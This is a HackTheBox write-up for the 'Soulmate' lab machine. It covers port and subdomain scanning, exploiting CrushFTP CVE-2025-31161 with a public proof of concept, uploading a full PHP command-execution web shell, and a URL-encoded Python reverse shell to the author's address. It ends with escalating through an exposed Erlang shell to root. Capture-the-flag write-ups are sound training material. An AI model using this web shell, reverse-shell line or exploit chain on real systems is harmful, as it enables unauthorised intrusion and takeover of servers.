---
title: Soulmate Box Write Up (HackTheBox)
date: 2025-12-05 12:00:00 + 0100
tags: [HackTheBox]
categories: [Write Ups]
---

This is a write up for the Soulmate Box on HackTheBox (link [here](https://www.hackthebox.com/machines/soulmate)).

## Initial Configuration

Add this line to the bottom of your `/etc/hosts` file:

```
10.10.11.86 soulmate.htb
```

## Reconnaissance

To start, `rustscan` was used to enumerate the open ports on the target machine:

```
sudo rustscan 10.10.11.86
```

![Rust Scan](/img/Soulmate_Rustscan.png)

We see ports: 

 - `22`: SSH
 - `80`: HTTP Web Server
 - `4369`: EPMD (Erlang Port Mapper Daemon)

`Nmap` scan with the flags `-sV -sC` on the open ports: 

```
sudo nmap -sV -sC 10.10.11.86 -p22,80,4369
```

![Nmap Scan](/img/Soulmate_NmapScan.png)

`Gobuster` scan to enumerate sub directories:

```
gobuster dir -u http://soulmate.htb -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

![Gobuster Scan](/img/Soulmate_Gobuster.png)

Gobuster didn't really return anything valuable.

Checking out the website on port `80`, we can see that it's a dating site:

![Soulmate Website](/img/Soulmate_Website.png)

To enumerate the subdomains of the website `ffuf` can be used:

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u http://soulmate.htb/ -H "Host:FUZZ.soulmate.htb" -c -t 50 -fs 154  
```

![Ffuf Scan](/img/Soulmate_Ffuf.png)

The subdomain `ftp` was found. This needs to be added to our `/etc/hosts` file, as such:

![Hosts File](/img/Soulmate_HostsFile.png)

Now we can navigate over to `http://ftp.soulmate.htb`:

![CrushFTP Website](/img/Soulmate_CrushFTP.png)

In the source code of the website page, we can see the version of CrushFTP:

![CrushFTP Version](/img/Soulmate_CrushFTPVersion.png)

## Initial Access

A google search reveals CVE-2025-31161. Thanks to Immersive Labs Security, a POC can be found on [github](https://github.com/Immersive-Labs-Sec/CVE-2025-31161).

Armed with this exploit, we can create a user on the site:

```
python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user testuser --password testpassword
```

![CVE-2025-31161 Exploit POC](/img/Soulmate_FTPExploit.png)

Now we can log in with the credentials we just created:

![CrushFTP Testuser Login](/img/Soulmate_TestUserLogin.png)

Now, logged in as `testuser`, we can look around the CrushFTP Dasboard:

![CrushFTP Main Page](/img/Soulmate_CrushFTPMainPage.png)

Instantly the **Admin** page looks interesting:

![CrushFTP Admin Page](/img/Soulmate_CrushFTPAdminPage.png)

Looking around the **Admin** dashboard leads to the **User Manager**, because here we can change the password of the user `ben`. We can also see that the webserver is hosted inside `ben`'s files. :

![CrushFTP User Manager](/img/Soulmate_CrushFTPUserManager.png)

![CrushFTP Ben Password Change](/img/Soulmate_CrushFTPBenFiles.png)

By changing the password to something like `example123`, we can log with the user `ben`:

![CrushFTP Ben Login](/img/Soulmate_CrushFTPBenLogin.png)

Now, logged in as `ben`, we can finally upload files to the web server:

![CrushFTP Ben Files](/img/Soulmate_CrushFTPBenFiles2.png)

Files uploaded to the FTP interface become accessible via the web server. This means we can make the server run any code stored in the file uploaded. We can choose whatever payload we want to upload now, but I'll go with a simple php backdoor:

```
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

This can be used by going to `http://www.example.com/shell.php?cmd=ls`, where `shell.php` is the name of the file uploaded.

![CrushFTP Backdoor Upload](/img/Soulmate_CrushFTPBackdoorUpload.png)

Now we can go to `http://soulmate.htb/backdoor.php?cmd=id` to test the backdoor:

![CrushFTP Backdoor ID](/img/Soulmate_CrushFTPBackdoorID.png)

Indeed it works. It does get removed from the web server every few minutes, so you have to be quick or keep reuploading it.

Now we want to get a reverse shell on the web server. First open a `netcat` listener:

```
nc -lvnp 4444
```

![Netcat Listener](/img/Soulmate_Netcat.png)

Getting the reverse shell can be done using **Python** by going to:

```
http://soulmate.htb/backdoor.php?cmd=python3%20-c%20%27import%20os,pty,socket;s=socket.socket();s.connect((%2210.10.14.194%22,4444));[os.dup2(s.fileno(),f)for%20f%20in(0,1,2)];pty.spawn(%22sh%22)%27
``` 

 - The IP needs to be configured to your IP (mine was `10.10.14.194`)
 - The port needs to be configured to the port `netcat` is listening to (mine was `4444`)

![Web Server Shell](/img/Soulmate_WebServerShell.png)

Now we have reverse shell to the web server! We should start by checking what our `id` is and upgrading to a tty shell:

![Initial Shell](/img/Soulmate_InitialShell.png)

## Privilege Escalation

Running [linpeas.sh](https://github.com/peass-ng/PEASS-ng) is the best way to escalate privileges further. First set up a python http server:

```
python -m http.server 8080
```

![Python HTTP Server](/img/Soulmate_PythonHTTPServer.png)

Then use `wget` to get the `linpeas.sh` script:

![Wget Linpeas](/img/Soulmate_WgetLinpeas.png)

Then do `chmod +x linpeas.sh` to make it an executable and run it:

![Linpeas Script](/img/Soulmate_Linpeas.png)

A couple of interesting things are found:

Most likely a custom SSH service running on port `2222`. This will be important later:

![Linpeas Custom SSh](/img/Soulmate_LinpeasCustomSSH.png)

The next key finding is a file added by a user:

![Linpeas Erlang Login Escript](/img/Soulmate_LinpeasErlang.png)

When opened, this script reveals the password of `ben`:

![Erlang Login Start.escript](/img/Soulmate_ErlangStartEscript.png)

This password can then be used to get an SSH connection as `ben`:

![SSH Connection](/img/Soulmate_SSHConnection.png)

Now the user flag is obtained:

![User Flag Obtained](/img/Soulmate_UserFlagObtained.png)

## Root Flag

Before we ran into a custom SSH service running on port `2222`. Lets try connecting to it:

![Custom SSH Connection](/img/Soulmate_CustomSSHConnection.png)

It's a **Eshell**. Using commands we can now easily get the root flag:

![Root Flag Obtained](/img/Soulmate_RootFlagObtained.png)

Box is **rooted**!